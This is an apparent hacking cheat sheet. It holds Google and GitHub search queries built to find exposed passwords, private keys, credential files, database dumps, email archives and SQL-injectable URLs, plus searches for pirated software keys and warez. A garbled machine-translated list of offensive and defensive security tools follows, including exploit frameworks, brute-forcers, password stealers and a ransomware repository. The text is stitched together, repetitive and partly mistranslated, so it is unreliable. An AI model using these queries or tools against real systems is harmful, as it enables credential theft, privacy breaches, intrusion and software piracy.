Nina Simone intitle:”index.of” “parent directory” “size” “last modified” “description” I Put A Spell On You (mp4|mp3|avi|flac|aac|ape|ogg) -inurl:(jsp|php|html|aspx|htm|cf|shtml|lyrics-realm|mp3-collection) -site:.info
Bill Gates intitle:”index.of” “parent directory” “size” “last modified” “description” Microsoft (pdf|txt|epub|doc|docx) -inurl:(jsp|php|html|aspx|htm|cf|shtml|ebooks|ebook) -site:.info
parent directory /appz/ -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory DVDRip -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Xvid -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Gamez -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory MP3 -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Name of Singer or album -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
filetype:config inurl:web.config inurl:ftp
“Windows XP Professional” 94FBR
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:"budget approved") inurl:confidential
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:”budget approved”) inurl:confidential
ext:inc "pwd=" "UID="
ext:ini intext:env.ini
ext:ini Version=... password
ext:ini Version=4.0.0.4 password
ext:ini eudora.ini
ext:ini intext:env.ini
ext:log "Software: Microsoft Internet Information Services *.*"
ext:log "Software: Microsoft Internet Information
ext:log "Software: Microsoft Internet Information Services *.*"
ext:log \"Software: Microsoft Internet Information Services *.*\"
ext:mdb   inurl:*.mdb inurl:fpdb shop.mdb
ext:mdb inurl:*.mdb inurl:fpdb shop.mdb
ext:mdb inurl:*.mdb inurl:fpdb shop.mdb
filetype:SWF SWF
filetype:TXT TXT
filetype:XLS XLS
filetype:asp   DBQ=" * Server.MapPath("*.mdb")
filetype:asp "Custom Error Message" Category Source
filetype:asp + "[ODBC SQL"
filetype:asp DBQ=" * Server.MapPath("*.mdb")
filetype:asp DBQ=\" * Server.MapPath(\"*.mdb\") 
filetype:asp “Custom Error Message” Category Source
filetype:bak createobject sa
filetype:bak inurl:"htaccess|passwd|shadow|htusers"
filetype:bak inurl:\"htaccess|passwd|shadow|htusers\" 
filetype:conf inurl:firewall -intitle:cvs 
filetype:conf inurl:proftpd. PROFTP FTP server configuration file reveals
filetype:dat "password.dat
filetype:dat \"password.dat\" 
filetype:eml eml +intext:"Subject" +intext:"From" +intext:"To"
filetype:eml eml +intext:\"Subject\" +intext:\"From\" +intext:\"To\" 
filetype:eml eml +intext:”Subject” +intext:”From” +intext:”To”
filetype:inc dbconn 
filetype:inc intext:mysql_connect
filetype:inc mysql_connect OR mysql_pconnect 
filetype:log inurl:"password.log"
filetype:log username putty PUTTY SSH client logs can reveal usernames
filetype:log “PHP Parse error” | “PHP Warning” | “PHP Error”
filetype:mdb inurl:users.mdb
filetype:ora ora
filetype:ora tnsnames
filetype:pass pass intext:userid
filetype:pdf "Assessment Report" nessus
filetype:pem intext:private
filetype:properties inurl:db intext:password
filetype:pst inurl:"outlook.pst"
filetype:pst pst -from -to -date
filetype:reg reg +intext:"defaultusername" +intext:"defaultpassword"
filetype:reg reg +intext:\"defaultusername\" +intext:\"defaultpassword\" 
filetype:reg reg +intext:â? WINVNC3â?
filetype:reg reg +intext:”defaultusername” +intext:”defaultpassword”
filetype:reg reg HKEY_ Windows Registry exports can reveal
filetype:reg reg HKEY_CURRENT_USER SSHHOSTKEYS
filetype:sql "insert into" (pass|passwd|password)
filetype:sql ("values * MD5" | "values * password" | "values * encrypt")
filetype:sql (\"passwd values\" | \"password values\" | \"pass values\" ) 
filetype:sql (\"values * MD\" | \"values * password\" | \"values * encrypt\") 
filetype:sql +"IDENTIFIED BY" -cvs
filetype:sql password
filetype:sql password 
filetype:sql “insert into” (pass|passwd|password)
filetype:url +inurl:"ftp://" +inurl:";@"
filetype:url +inurl:\"ftp://\" +inurl:\";@\" 
filetype:url +inurl:”ftp://” +inurl:”;@”
filetype:xls inurl:"email.xls"
filetype:xls username password email
index of: intext:Gallery in Configuration mode
index.of passlist
index.of perform.ini mIRC IRC ini file can list IRC usernames and
index.of.dcim 
index.of.password 
intext:" -FrontPage-" ext:pwd inurl:(service | authors | administrators | users)
intext:""BiTBOARD v2.0" BiTSHiFTERS Bulletin Board"
intext:"# -FrontPage-" ext:pwd inurl:(service | authors | administrators | users) "# -FrontPage-" inurl:service.pwd
intext:"#mysql dump" filetype:sql
intext:"#mysql dump" filetype:sql 21232f297a57a5a743894a0e4a801fc3
intext:"A syntax error has occurred" filetype:ihtml
intext:"ASP.NET_SessionId" "data source="
intext:"About Mac OS Personal Web Sharing"
intext:"An illegal character has been found in the statement" -"previous message"
intext:"AutoCreate=TRUE password=*"
intext:"Can't connect to local" intitle:warning
intext:"Certificate Practice Statement" filetype:PDF | DOC
intext:"Certificate Practice Statement" inurl:(PDF | DOC)
intext:"Copyright (c) Tektronix, Inc." "printer status"
intext:"Copyright © Tektronix, Inc." "printer status"
intext:"Emergisoft web applications are a part of our"
intext:"Error Diagnostic Information" intitle:"Error Occurred While"
intext:"Error Message : Error loading required libraries."
intext:"Establishing a secure Integrated Lights Out session with" OR intitle:"Data Frame - Browser not HTTP 1.1 compatible" OR intitle:"HP Integrated Lights-
intext:"Fatal error: Call to undefined function" -reply -the -next
intext:"Fill out the form below completely to change your password and user name. If new username is left blank, your old one will be assumed." -edu
intext:"Generated   by phpSystem"
intext:"Generated by phpSystem"
intext:"Host Vulnerability Summary Report"
intext:"HostingAccelerator" intitle:"login" +"Username" -"news" -demo
intext:"IMail Server Web Messaging" intitle:login
intext:"Incorrect syntax near"
intext:"Index of" /"chat/logs"
intext:"Index of /network" "last modified"
intext:"Index of /" +.htaccess
intext:"Index of /" +passwd
intext:"Index of /" +password.txt
intext:"Index of /admin"
intext:"Index of /backup"
intext:"Index of /mail"
intext:"Index of /password"
intext:"Microsoft (R) Windows * (TM) Version * DrWtsn32 Copyright (C)" ext:log
intext:"Microsoft CRM : Unsupported Browser Version"
intext:"Microsoft ® Windows * ™ Version * DrWtsn32 Copyright ©" ext:log
intext:"Network Host Assessment Report" "Internet Scanner"
intext:"Network Vulnerability   Assessment Report"
intext:"Network Vulnerability Assessment Report"
intext:"Network Vulnerability Assessment Report" 本文来自 pc007.com
intext:"SQL Server Driver][SQL Server]Line 1: Incorrect syntax near"
intext:"Thank you for your order"   +receipt
intext:"Thank you for your order" +receipt
intext:"Thank you for your purchase" +download
intext:"The following report contains confidential information" vulnerability -search
intext:"phpMyAdmin MySQL-Dump" "INSERT INTO" -"the"
intext:"phpMyAdmin MySQL-Dump" filetype:txt
intext:"phpMyAdmin" "running on" inurl:"main.php"
intextpassword | passcode)   intextusername | userid | user) filetype:csv
intextpassword | passcode) intextusername | userid | user) filetype:csv
intitle:"index of" +myd size
intitle:"index of" etc/shadow
intitle:"index of" htpasswd
intitle:"index of" intext:connect.inc
intitle:"index of" intext:globals.inc
intitle:"index of" master.passwd
intitle:"index of" master.passwd 007电脑资讯
intitle:"index of" members OR accounts
intitle:"index of" mysql.conf OR mysql_config
intitle:"index of" passwd
intitle:"index of" people.lst
intitle:"index of" pwd.db
intitle:"index of" spwd
intitle:"index of" user_carts OR user_cart
intitle:"index.of *" admin news.asp configview.asp
intitle:("TrackerCam Live Video")|("TrackerCam Application Login")|("Trackercam Remote") -trackercam.com
intitle:(“TrackerCam Live Video”)|(“TrackerCam Application Login”)|(“Trackercam Remote”) -trackercam.com
inurl:admin inurl:userlist Generic userlist files

------------------------------------------------------------------------------------------
Using special search string to find vulnerable websites:

inurl:php?=id1
inurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num= andinurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num=
```
### github dorks

```
filename:.npmrc _auth
filename:.dockercfg auth
extension:pem private
extension:ppk private
filename:id_rsa or filename:id_dsa
extension:sql mysql dump
extension:sql mysql dump password
filename:credentials aws_access_key_id
filename:.s3cfg
filename:wp-config.php
filename:.htpasswd
filename:.env DB_USERNAME NOT homestead
filename:.env MAIL_HOST=smtp.gmail.com
filename:.git-credentials
PT_TOKEN language:bash
filename:.bashrc password
filename:.bashrc mailchimp
filename:.bash_profile aws
rds.amazonaws.com password
extension:json api.forecast.io
extension:json mongolab.com
extension:yaml mongolab.com
jsforce extension:js conn.login
SF_USERNAME "salesforce"
filename:.tugboat NOT "_tugboat"
HEROKU_API_KEY language:shell
HEROKU_API_KEY language:json
filename:.netrc password
filename:_netrc password
filename:hub oauth_token
filename:robomongo.json
filename:filezilla.xml Pass
filename:recentservers.xml Pass
filename:config.json auths
filename:idea14.key
filename:config irc_pass
filename:connections.xml
filename:express.conf path:.openshift
filename:.pgpass
filename:proftpdpasswd
filename:ventrilo_srv.ini
[WFClient] Password= extension:ica
filename:server.cfg rcon password
JEKYLL_GITHUB_TOKEN
filename:.bash_history
filename:.cshrc
filename:.history
filename:.sh_history
filename:sshd_config
filename:dhcpd.conf
filename:prod.exs NOT "prod.secret.exs"
filename:prod.secret.exs
filename:configuration.php JConfig password
filename:config.php dbpasswd
filename:config.php pass
path:sites databases password
shodan_api_key language:python
shodan_api_key language:shell
shodan_api_key language:json
shodan_api_key language:ruby
filename:shadow path:etc
filename:passwd path:etc
extension:avastlic
extension:dbeaver-data-sources.xml
filename:sftp-config.json
filename:.esmtprc password
extension:json googleusercontent client_secret
HOMEBREW_GITHUB_API_TOKEN language:shell
```
- https://github.com/deadPix3l/CryptSky/ (вымогатель)
Защита DDOS
- https://github.com/ywjt/Dshield
waf с открытым исходным кодом и правил
- https://github.com/SpiderLabs/ModSecurity
- https: // github.com/xsec-lab/x-waf
- https://github.com/loveshell/ngx_lua_waf
- https://github.com/SpiderLabs/owasp-modsecurity-crs/tree/master/base_rules
руководство по
началу работы https: // wizardforcel .gitbooks.io / web-hacking-101 / content / Web Hacking 101 Китайская версия
- https://wizardforcel.gitbooks.io/asani/content/ Малая запись Безопасность Android Китайская версия
- https://wizardforcel.gitbooks.io/ Руководство по обучению тестированию на проникновение lpad / content / Android на китайском языке
- https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/content/ Читы для веб-тестов на проникновение Kali Linux для китайской версии
- https://github.com/hardenedlinux/linux-exploit-development-tutorial Введение в разработку эксплойтов для Linux
- https://www.gitbook.com/book/t0data/burpsuite/details burpsuite Руководство по боевым действиям
- http://www.kanxue.com /?article-read-1108.htm=&winzoom=1 Тест на проникновение Node.js приложение
- https://github.com/qazbnm456/awesome-web-security Информация о безопасности веб-сайта и список ресурсов
- https://sec-wiki.com/ sec-wiki Безопасная
коллекция нечетких инструментов Википедии
- https://github.com/ivanfratric/winafl
- https://github.com/attekett/NodeFuzz
- https://github.com/google/oss-fuzz
-http://blog.topsec.com.cn/ad_lab/alphafuzzer/
- http://llvm.org/docs/LibFuzzer.html
Сканер перечисления поддоменов или инструмент для взрывных работ
- https://github.com/n4xh4ck5/N4xD0rk (используйте поисковую систему для сбора суб Доменное имя, можно собрать на испанском)
- https://github.com/jonluca/Anubis
- https://github.com/lijiejie/subDomainsBrute (широко используемый инструмент для подсчета поддоменных доменов, разработанный lijiejie)
- https://github.com/ring04h/wydomain ( Комплексный и точный инструмент перечисления поддоменов для сбора доменных имен, разработанный Pigman)
- https://github.com/le4f/dnsmaper ( инструмент для уничтожения перечисления поддоменов и маркер местоположения на карте)
- https://github.com/ 0xbug / orangescan (онлайн-инструмент сбора информации о поддоменах, который предоставляет веб-интерфейс)
- https://github.com/TheRook/subbrute (эффективный и точный инструмент для уничтожения поддоменов, а также наиболее часто используемая библиотека API поддоменов в сканере)
- https: //github.com/We5ter/GSDF (скрипт запроса субдомена на основе прозрачного сертификата Google SSL)
- https://github.com/mandatoryprogrammer/cloudflare_enum ( скрипт для перечисления субдомена с использованием CloudFlare)
- https://github.com / guelfoweb / knock (получение домена Knock, может использоваться для поиска уязвимостей захвата домена)
- https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker(Несколько способов сбора информации о целевом поддомене)
- https://github.com/code-scan/BroDomain (запрос имени домена брата)
- https://github.com/chuhades/dnsbrute (эффективный инструмент для
уничтожения поддоменов) - https: // github.com/yanxiu0614/subdomain3 (эффективный инструмент для уничтожения поддоменов)
- https://github.com/michenriksen/aquatone ( инструмент для перечисления и обнаружения поддоменов. Может использоваться для обнаружения уязвимости захвата поддоменов)
- https://github.com / evilsocket / dnssearch (инструмент для уничтожения поддоменов)
- https://github.com/reconned/domained (инструмент, который можно использовать для сбора поддоменов)
- https://github.com/bit4woo/Teemo (коллекция доменов И инструмент перечисления)
- https://github.com/laramies/theHarvester (почтовый ящик, сервер сбора информации и инструмент
подсчета поддоменов ) - https://github.com/swisskyrepo/Subdomino (перечисление поддоменов, сканирование портов, сервис Подтверждение выживания)
- https://github.com/nmalcolm/Inventus (инструмент сбора поддоменов, реализованный сканерами)
- https://github.com/aboul3la/Sublist3r (быстрый инструмент подсчета поддоменов),
сканер уязвимостей или инструмент для взрывных работ по типу базы данных
- https://github.com/0xbug/SQLiScanner (пассивная уязвимость внедрения SQL-кода, основанная на SQLMAP и Charles Инструмент сканирования)
- https://github.com/sqlmapproject/sqlmap (король инструментов инъекций sqlmap)
- https://github.com/stamparm/DSSS (99 строк кода для реализации сканера уязвимостей инъекций SQL)
- https://github.com/LoRexxar/Feigong (свободно меняющийся сценарий внедрения MySQL для различных ситуаций)
- https://github.com/youngyangyang04/NoSQLAttack (инструмент атаки для mongoDB)
- https://github.com/Neohapsis/bbqsql (SQL Среда слепого внедрения)
- https://github.com/NetSPI/PowerUpSQL (среда сценариев Powershell, которая атакует SQLSERVER)
- https://github.com/WhitewidowScanner/whitewidow (сканер базы данных)
- https://github.com/ штамповка / монгоаудит(Инструмент аудита и проникновения MongoDB)
- https://github.com/torque59/Nosql-Exploitation-Framework ( инструмент для сканирования / обработки NoSQL)
- https://github.com/missDronio/blindy (инструмент для слепой струйной обработки MySQL)
- https://github.com/fengxuangit/Fox-scan (инструмент сканирования уязвимостей для обнаружения активных и пассивных ресурсов на основе SQLMAP)
- https://github.com/NetSPI/PowerUpSQL (сценарий powershell для аудита SQL Server)
- https://github.com / JohnTroony / Blisqy ( инструмент для слепой инъекции в заголовке http, только для MySQL / MariaDB)
- https://github.com/ron190/jsql-injection (инструмент для инъекции SQL, написанный на Java)
- https://github.com/Hadesy2k/sqliv (сканер уязвимостей для массовых инъекций SQL на основе поисковой системы)
- https://github.com/UltimateHackers/sqlmate (добавлено сканирование каталогов, удаление хеш-файлов и другие функции на основе sqlmap)
слабый пароль / слабый Сканер имени пользователя или инструмент для взрывных работ
- https://github.com/lijiejie/htpwdScan(Простое http-взлома, сценарий атаки библиотечного столкновения)
- https://github.com/ysrc/F-Scrack ( скрипт для обнаружения слабых паролей различных служб)
- https://github.com/Mebus/cupp (Создать скрипт словаря для обнаружения слабых паролей в соответствии с привычками пользователя)
- https://github.com/netxfly/crack_ssh (сопрограммная версия инструмента взлома слабых паролей ssh ​​\ redis \ mongodb, написанного Go)
- https://github.com/LandGrey/ pydictor (инструмент создания словаря взлома)
- https://github.com/shengqi158/weak_password_detect (обнаружение слабого пароля в многопоточном режиме)
- https://github.com/UltimateHackers/Blazy (поддерживает тестирование слабых паролей для CSRF, Clickjacking, Cloudflare и WAF Зонд)
Средство идентификации IoT-устройства или сканер
- https://github.com/reverse-shell/routersploit (структура эксплойта маршрутизатора)
- https://github.com/jh00nbr/Routerhunter-2.0 (сканирование эксплойта маршрутизатора)
- https://github.com/RUB-NDS/PRET ( инфраструктура атаки на принтер)
- https://github.com/rapid7/IoTSeeker ( по умолчанию пароль вещи устройство Scan Tool)
- https://github.com/shodan-labs/iotdb (IoT с помощью Nmap сканирующего устройства)
- https://github.com/googleinurl / RouterHunterBR (сканирование и использование уязвимостей устройства маршрутизатора)
- https://github.com/scu-igroup/telnet-scanner (библиотека столкновения паролей службы Telnet)
отражающий или XSS-сканер на основе DOM
- https://github.com/shawarkhanethicalhacker/ BruteXSS (XSS-сканер с параметрами впрыска грубой силы)
- https://github.com/1N3/XSSTracer (небольшой XSS-сканер, который также может обнаруживать CRLF, XSS, перехваты кликов)
- https://github.com/0x584A / fuzzXssPHP (PHP-версия отражающего сканирования xss)
- https://github.com/chuhades/xss_scan (сценарий python для пакетного сканирования XSS)
- https://github.com/BlackHole1/autoFindXssAndCsrf (автоматическое обнаружение существования XSS и CSRF Уязвимый плагин для браузера)
- https://github.com/shogunlab/shuriken (обнаружение пакетов XSS с помощью командной строки)
- https://github.com/UltimateHackers/XSStrike (средство сканирования XSS, которое может определять и обходить WAF)
- https://github.com / stamparm / DSXS (эффективный сканер XSS, поддерживающий GET и POST). Средство
управления активами предприятия или сбора утечки информации
- https://github.com/ysrc/xunfeng (механизм распознавания сетевых активов, механизм обнаружения уязвимостей)
- https://github.com / laramies / theHarvester (предприятия включены в скрипты мониторинга поисковых систем для получения конфиденциальной информации об активах: почтовый ящик сотрудника, поддомен, хосты)
- https://github.com/x0day/Multisearch-v2 (Bing, google, 360, zoomeye и другие поисковые системы Агрегированный поиск, который можно использовать для поиска конфиденциальной информации об активах, собранной поисковыми системами)
- https://github.com/Ekultek/Zeus-Scanner (Интегрированная комплексная поисковая система, способная сканировать URL-адреса, скрытые поисковыми системами, и передавать их sqlmap, nmap scan)
- https://github.com/0xbug/Biu-framework (базовая среда сканирования безопасности корпоративной сети предприятия)
- https://github.com/metac0rtex/GitHarvester(инструмент сбора информации github Repo)
- https://github.com/shengqi158/svnhack (инструмент эксплуатации утечки папок .svn)
- https://github.com/repoog/GitPrey (инструмент сканирования конфиденциальной информации GitHub)
- https://github.com/0xbug/Hawkeye (корпоративные активы, система контроля утечки конфиденциальной информации GitHub)
- https://github.com/lianfeng30/githubscan (инструменты для поиска проекта и соответствующего сканирования конфиденциального файла и содержимого файлов по ключевым словам предприятия)
- https://github.com/UnkL4b/GitMiner (инструмент поиска конфиденциальной информации github)
- https://github.com/lijiejie/GitHack (инструмент эксплуатации утечки папок .git)
- https://github.com/dxa4481/truffleHog (конфиденциальная информация GitHub) Инструменты сканирования, включая обнаружение фиксаций и т. Д.)
Https://github.com/sowish/LNScan (сканер подробной внутренней информации о сети)
- https://github.com/SkyLined/LocalNetworkScanner (сканер локальной сети, реализованный на JavaScript)
- https://github.com/x0day/Multisearch-v2(Совокупный поиск в поисковых системах можно использовать для обнаружения конфиденциальной информации об активах, включенной в поисковые системы).
Инструмент обнаружения веб-оболочек или анализа вирусов
- https://github.com/ym2011/ScanBackdoor (простой инструмент сканирования веб-оболочек)
- https://github.com/yassineaddi/BackdoorMan (обнаружение php веб-оболочки для указанного каталога)
- https://github.com/he1m4n6a/findWebshell (простой инструмент обнаружения веб-оболочек)
- https://github.com/Tencent/HaboMalHunter (Hubble Система анализа, анализ вирусов в системе Linux и обнаружение безопасности)
- https://github.com/PlagueScanner/PlagueScanner (антивирусное ядро, интегрированное с ClamAV, ESET, Bitdefender с использованием Python)
- https://github.com/nbs-system/ php-malware-finder (эффективный инструмент сканирования PHP-веб-оболочек)
- https://github.com/emposha/PHP-Shell-Detector/ (инструмент обнаружения веб-оболочек с эффективностью тестирования до 99%)
- https://github.com / erevus-cn / scan_webshell (простой инструмент сканирования Webshell)
- https://github.com/emposha/Shell-Detector (инструмент сканирования Webshell, поддерживает сканирование php / perl / asp / aspx webshell)
- https://github.com/m4rco-/dorothy2 (троянец, среда анализа ботнетов )
Инструмент для проникновения в интрасеть или сканирования
- https://github.com/0xwindows/VulScritp (сценарий проникновения в корпоративную интрасеть, включая сканирование баннеров, сканирование портов; phpmyadmin, jenkins и т. Д. Использование общих уязвимостей и т. Д.)
Https://github.com/lcatro / network_backdoor_scanner (инфраструктура обнаружения в интрасети, основанная на сетевом трафике)
- https://github.com/fdiskyou/hunter (вызвать Windows API для перечисления информации для входа пользователя)
- https://github.com/BlackHole1/WebRtcXSS (автоматически использовать XSS для вторжения Интернет)
- https://github.com/0xwindows/VulScritp (сценарий проникновения в корпоративную интрасеть, включая сканирование баннеров, сканирование портов; различные общие действия и т. Д.)
Https://github.com/fdiskyou/hunter (вызов API-интерфейсов Windows ) Введите информацию для входа в систему пользователя)
- https://github.com/AlessandroZ/LaZagne(Средство извлечения локального представления пароля)
- https://github.com/huntergregal/mimipenguin (артефакт захвата пароля linux)
сканер промежуточного программного обеспечения или средство идентификации
- https://nmap.org/download.html (сканер портов Nmap) Wang, -https : //svn.nmap.org/ )
- https://github.com/ring04h/wyportmap (сканирование целевого порта + распознавание отпечатков пальцев системной службы)
- https://github.com/ring04h/weakfilescan (динамическая многопоточность) Инструмент обнаружения утечки конфиденциальной информации)
- https://github.com/EnableSecurity/wafw00f (распознавание отпечатков пальцев продукта WAF)
- https://github.com/rbsec/sslscan (распознавание типа ssl)
- https://github.com/urbanadventurer/whatweb (распознавание отпечатков пальцев в Интернете)
- https://github.com/tanjiti/FingerPrint (распознавание отпечатков пальцев в веб-приложениях)
- https://github.com/nanshihui/Scan-T (распознавание отпечатков пальцев в веб-сканере)
- https://github.com/ OffensivePython / Nscan(быстрый сетевой сканер, созданный на основе Masscan и Zmap)
- https://github.com/ywolf/F-NAScan (сканирование информации о сетевых ресурсах , обнаружение выживания ICMP, сканирование портов, идентификация службы идентификации отпечатков портов)
- https://github.com/ ywolf / F-MiddlewareScan (сканирование промежуточного программного обеспечения)
- https://github.com/maurosoria/dirsearch (сканер веб-пути)
- https://github.com/x0day/bannerscan (сканирование баннера и пути сегмента C)
- https://github.com / RASSec / RASscan (сканирование службы портов)
- https://github.com/3xp10it/bypass_waf (автоматический всплеск waf )
- https://github.com/3xp10it/xcdn (попытайтесь выяснить реальный ip за cdn )
- https://github.com/Xyntax/BingC (поисковая система B-сегмента, основанная на запросе сегмента C / боковой станции, многопоточность, поддержка API)
- https://github.com/Xyntax/DirBrute (инструмент многопоточной обработки веб-каталогов)
- https://github.com/zer0h/-httpscan (гаджет обнаружения веб-хоста в стиле искателя)
- https://github.com/lietdai/doom (сканер уязвимостей IP-портов для распределенного распределения задач, реализованный на thorn)
- https://github.com/ chichou / grab.js (инструмент для быстрого анализа отпечатков пальцев TCP, похожий на zgrab, поддерживает больше протоколов)
- https://github.com/Nitr4x/whichCDN (распознавание CDN, обнаружение)
- https://github.com/secfree/bcrpscan (Сканер веб-путей на основе искателя)
- https://github.com/ring04h/wyportmap (сканирование целевого порта + распознавание отпечатков пальцев системной службы)
- https://github.com/rbsec/sslscan (распознавание типа SSL)
- https://github.com/urbanadventurer/whatweb (распознавание отпечатков пальцев в Интернете)
- https://github.com/tanjiti/FingerPrint (распознавание отпечатков пальцев в веб-приложениях)
- https://github.com/OffensivePython/Nscan (сетевой сканер на основе Masscan и Zmap)
- https://github.com/maurosoria/dirsearch (сбор и сканирование веб-путей)
- https://github.com/3xp10it/xcdn (попытайтесь выяснить реальный IP-адрес позади cdn)
- https://github.com/lietdai/doom (сканер уязвимостей IP-портов для распределения распределенных задач, реализованный в Thorn)
- https://github.com/mozilla/ssh_scan (сканирование информации о конфигурации сервера ssh)
- https://github.com/18F/domain-scan (обнаружение / сканирование данных активов для доменных имен и поддоменов, включая обнаружение-http / -https И т. Д.)
Https://github.com/ggusoft/inforfinder (инструмент для сбора активов доменных имен и распознавания отпечатков пальцев)
- https://github.com/boy-hack/gwhatweb (реализация Python Gevent для распознавания CMS)
- https://github.com/ Mosuan / FileScan (сканирование конфиденциальных файлов / вторичное суждение для снижения частоты ложных срабатываний / регуляризация содержимого сканирования / сканирование нескольких каталогов)
- https://github.com/Xyntax/FileSensor (средство обнаружения динамических чувствительных файлов на основе сканера )
- https://github.com/deibit/cansina (средство сканирования веб-путей)
- https://github.com/0xbug/Howl (сканирование и поиск отпечатков пальцев веб-службы сетевого устройства)
- https://github.com/mozilla/cipherscan (распознавание типа ssl целевого хост-сервиса)
- https://github.com/xmendez/wfuzz (инструмент для создания веб-приложений, инфраструктура, а также может использоваться для сканирования веб-путей / сервисов)
- https://github.com/UltimateHackers/Breacher (многопоточный фоновый сканер путей, также можно использовать для поиска уязвимостей Execution After Redirect)
- https://github.com/ztgrace/changeme (сканер слабых паролей, не только поддерживает обычные страницы входа, но и Поддерживает ssh, mongodb и другие компоненты)
- https://github.com/medbenali/CyberScan (вспомогательный инструмент тестирования на проникновение, поддерживает анализ пакетов данных, декодирование, сканирование портов, анализ IP-адресов и т. Д.)
Https://github.com/m0nad/HellRaiser (Сканер на основе Nmap, связанный с уязвимостью cve)
- https://github.com/scipag/vulscan (расширенный сканер уязвимостей на основе nmap, используемый в среде командной строки)
- https://github.com/jekyc/wig (web) Инструмент сбора информации о приложении)
- https://github.com/eldraco/domain_analyzer (сбор информации и «передача домена» вокруг доменного имени веб-службы сканируются на наличие уязвимостей и поддержки сканирования портов сервера и т. Д.)
- https://github.com/cloudtracer/paskto (сканирование пассивного пути и поиск информации на основе правил сканирования Nikto)
- https://github.com/zerokeeper/WebEye (быстрая идентификация типа веб-сервера, типа CMS, типа WAF, информации WHOIS И языковая структура)
- https://github.com/m3liot/shcheck (для проверки безопасности заголовка веб-службы-http)
- https://github.com/aipengjie/sensitivefilescan (эффективное и быстрое сканирование конфиденциальных файлов). Инструменты)
- https://github.com/fnk0c/cangibrina (кроссплатформенный сканер путей фонового управления через исчерпание словаря, google, robots.txt и т. Д.)
Https://github.com/n4xh4ck5/CMSsc4n (распознавание отпечатков пальцев CMS) )
Выделенный (то есть специфический для определенных компонентов) сканер
- https://github.com/brianwrf/hackUtils (набор инструментов для использования десериализации Java)
- https://github.com/frohoff/ysoserial (использование десериализации Java) Инструменты)
- https://github.com/blackye/Jenkins (обнаружение уязвимостей Jenkins, сканирование и удаление пользователей)
- https://github.com/code-scan/dzscan (поиск уязвимостей discuz)
- https://github.com/chuhades/CMS-Exploit-Framework (среда атаки CMS)
- https://github.com/lijiejie/IIS_shortname_Scanner ( Уязвимость сканирования коротких имен файлов IIS)
- https://github.com/riusksk/FlashScanner (сканирование flashxss)
- https://github.com/coffeehb/SSTIF (полуавтоматический инструмент для уязвимости, связанной с внедрением шаблонов на стороне сервера)
- https://github.com/epinna/tplmap (инструмент обнаружения и эксплуатации уязвимостей при внедрении шаблонов на стороне сервера)
- https://github.com/cr0hn/dockerscan (средство сканирования докеров)
- https://github.com/GoSecure/break-fast-serial (с DNS Анализ для обнаружения инструмента уязвимости десериализации Java)
- https://github.com/dirtycow/dirtycow.github.io (exp-уязвимость повышения привилегий коровьей модели)
- https://github.com/code-scan/dzscan (первая интеграция Discuz сканирующий инструмент)
- https://github.com/chuhades/CMS-Exploit-Framework (простая и элегантная среда сканирования и использования CMS)
- https://github.com/lijiejie/IIS_shortname_Scanner (инструмент для использования уязвимости перебора имен с помощью грубой силы в IIS)
- https://github.com/coffeehb/SSTIF (полуавтоматический инструмент для выявления уязвимостей при внедрении шаблонов на стороне сервера)
- https://github.com/cr0hn/dockerscan (средство сканирования Docker)
- https://github.com/m4ll0k/WPSeku (Упрощенный инструмент для сканирования WordPress)
- https://github.com/rastating/wordpress-exploit-framework (интегрированная среда эксплойтов WordPress)
- https://github.com/ilmila/J2EEScan (используется для сканирования приложений J2EE Плагин burpsuite)
- https://github.com/riusksk/StrutScan (сканер исторических уязвимостей strut2 на основе Perl)
- https://github.com/D35m0nd142/LFISuite (локальные файлы включают инструменты для эксплуатации уязвимостей и сканирования, (Поддержка отскок оболочки)
- https://github.com/0x4D31/salt-scanner (сканер уязвимостей Linux на основе Salt Open и API аудита Vulners Linux, поддерживает использование с JIRA, слабые платформы)
- https://github.com/tijme/angularjs-csti -scanner ( средство обнаружения уязвимостей при внедрении шаблонов AngularJS на клиентском компьютере)
- https://github.com/irsdl/IIS-ShortName-Scanner (средство эксплуатации уязвимости перечисления с помощью перебора коротких имен в IIS, написанное на Java)
- https://github.com / swisskyrepo / Wordpresscan (оптимизированная версия сканера WordPress на основе WPScan и WPSeku)
- https://github.com/CHYbeta/cmsPoc (среда тестирования на проникновение CMS)
- https://github.com/rudSarkar/crlf-injector (уязвимость внедрения CRLF) Пакетное сканирование)
- https://github.com/3gstudent/Smbtouch-Scanner (Автоматическое сканирование серии уязвимостей ETERNAL, просочившихся теневыми брокерами во внутренней сети)
- https://github.com/utiso/dorkbot (через настроенный Google Поисковая система для поиска и сканирования страниц уязвимостей)
- https://github.com/OsandaMalith/LFiFreak (локальный файл содержит инструменты для эксплойтов и сканирования, поддерживает оболочку для восстановления)
- https://github.com/mak-/parameth (поле неизвестного параметра GET / POST, используемое для перечисления скриптов )
- https://github.com/Lucifer1993/struts-scan (struts2 полная версия уязвимости и использовать инструмент обнаружения)
- https://github.com/hahwul/a2sv (сканирование уязвимостей SSL, уязвимости , такие как сердце крови и т.д.)
HTTPS://github.com/NullArray/DorkNet (веб-поиск уязвимостей на основе поисковых систем)
- https://github.com/NickstaDB/BaRMIe (инструмент, используемый для атаки и взрыва службы вызова удаленных методов Java)
- https://github.com/RetireJS / grunt-retire (сканирование на наличие общих уязвимостей в библиотеках расширений js)
